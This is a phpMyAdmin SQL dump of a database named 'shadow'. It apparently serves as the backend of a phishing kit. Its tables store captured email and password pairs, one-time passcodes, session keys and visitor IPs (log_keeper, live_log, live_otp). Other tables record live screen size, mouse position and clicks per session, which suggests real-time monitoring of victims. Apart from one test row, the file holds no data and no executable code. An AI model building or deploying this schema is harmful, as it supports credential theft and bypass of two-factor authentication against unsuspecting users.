-- phpMyAdmin SQL Dump
-- version 5.2.0
-- https://www.phpmyadmin.net/
--
-- Host: 127.0.0.1
-- Generation Time: Jun 01, 2023 at 02:15 AM
-- Server version: 10.4.27-MariaDB
-- PHP Version: 8.2.0

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `shadow`
--

-- --------------------------------------------------------

--
-- Table structure for table `black_keys`
--

CREATE TABLE `black_keys` (
  `id` int(11) UNSIGNED NOT NULL,
  `user_id` varchar(1000) NOT NULL,
  `key` varchar(1000) NOT NULL,
  `date` timestamp NOT NULL DEFAULT current_timestamp() ON UPDATE current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=armscii8 COLLATE=armscii8_bin;

-- --------------------------------------------------------

--
-- Table structure for table `in__`
--

CREATE TABLE `in__` (
  `id` int(11) UNSIGNED NOT NULL,
  `In_type` varchar(1000) NOT NULL,
  `In_width` varchar(1000) NOT NULL,
  `In_height` varchar(1000) NOT NULL,
  `In_mouseX` varchar(1000) NOT NULL,
  `In_mouseY` varchar(1000) NOT NULL,
  `In_click` varchar(1000) NOT NULL,
  `In_id` varchar(1000) NOT NULL,
  `date` timestamp NOT NULL DEFAULT current_timestamp() ON UPDATE current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=armscii8 COLLATE=armscii8_bin;

-- --------------------------------------------------------

--
-- Table structure for table `live`
--

CREATE TABLE `live` (
  `id` int(11) UNSIGNED NOT NULL,
  `In_type` varchar(1000) NOT NULL,
  `In_width` varchar(1000) NOT NULL,
  `In_height` varchar(1000) NOT NULL,
  `In_mouseX` varchar(1000) NOT NULL,
  `In_mouseY` varchar(1000) NOT NULL,
  `In_click` varchar(1000) NOT NULL,
  `In_id` varchar(1000) NOT NULL,
  `date` timestamp NOT NULL DEFAULT current_timestamp() ON UPDATE current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=armscii8 COLLATE=armscii8_bin;

--
-- Dumping data for table `live`
--

INSERT INTO `live` (`id`, `In_type`, `In_width`, `In_height`, `In_mouseX`, `In_mouseY`, `In_click`, `In_id`, `date`) VALUES
(1, '67', '1366', '663', '954', '18', '0', 'idontesting', '2023-05-31 10:46:21');

-- --------------------------------------------------------

--
-- Table structure for table `live_log`
--

CREATE TABLE `live_log` (
  `id` int(11) UNSIGNED NOT NULL,
  `mail` varchar(1000) NOT NULL,
  `pass` varchar(1000) NOT NULL,
  `key` varchar(1000) NOT NULL,
  `date` timestamp NOT NULL DEFAULT current_timestamp() ON UPDATE current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=armscii8 COLLATE=armscii8_bin;

-- --------------------------------------------------------

--
-- Table structure for table `live_otp`
--

CREATE TABLE `live_otp` (
  `id` int(11) UNSIGNED NOT NULL,
  `otp` varchar(1000) NOT NULL,
  `key` varchar(1000) NOT NULL,
  `date` timestamp NOT NULL DEFAULT current_timestamp() ON UPDATE current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=armscii8 COLLATE=armscii8_bin;

-- --------------------------------------------------------

--
-- Table structure for table `log_keeper`
--

CREATE TABLE `log_keeper` (
  `id` int(11) UNSIGNED NOT NULL,
  `mail` varchar(1000) NOT NULL,
  `pass` varchar(1000) NOT NULL,
  `otp` varchar(1000) NOT NULL,
  `key` varchar(1000) NOT NULL,
  `v_ip` varchar(1000) NOT NULL,
  `date` timestamp NOT NULL DEFAULT current_timestamp() ON UPDATE current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=armscii8 COLLATE=armscii8_bin;

-- --------------------------------------------------------

--
-- Table structure for table `user`
--

CREATE TABLE `user` (
  `id` int(11) UNSIGNED NOT NULL,
  `In_type` varchar(1000) NOT NULL,
  `In_width` varchar(1000) NOT NULL,
  `date` timestamp NOT NULL DEFAULT current_timestamp() ON UPDATE current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=armscii8 COLLATE=armscii8_bin;

--
-- Indexes for dumped tables
--

--
-- Indexes for table `black_keys`
--
ALTER TABLE `black_keys`
  ADD UNIQUE KEY `id` (`id`);

--
-- Indexes for table `in__`
--
ALTER TABLE `in__`
  ADD UNIQUE KEY `id` (`id`);

--
-- Indexes for table `log_keeper`
--
ALTER TABLE `log_keeper`
  ADD UNIQUE KEY `id` (`id`);

--
-- Indexes for table `user`
--
ALTER TABLE `user`
  ADD UNIQUE KEY `id` (`id`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `black_keys`
--
ALTER TABLE `black_keys`
  MODIFY `id` int(11) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=168;

--
-- AUTO_INCREMENT for table `in__`
--
ALTER TABLE `in__`
  MODIFY `id` int(11) UNSIGNED NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `log_keeper`
--
ALTER TABLE `log_keeper`
  MODIFY `id` int(11) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=168;

--
-- AUTO_INCREMENT for table `user`
--
ALTER TABLE `user`
  MODIFY `id` int(11) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=168;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
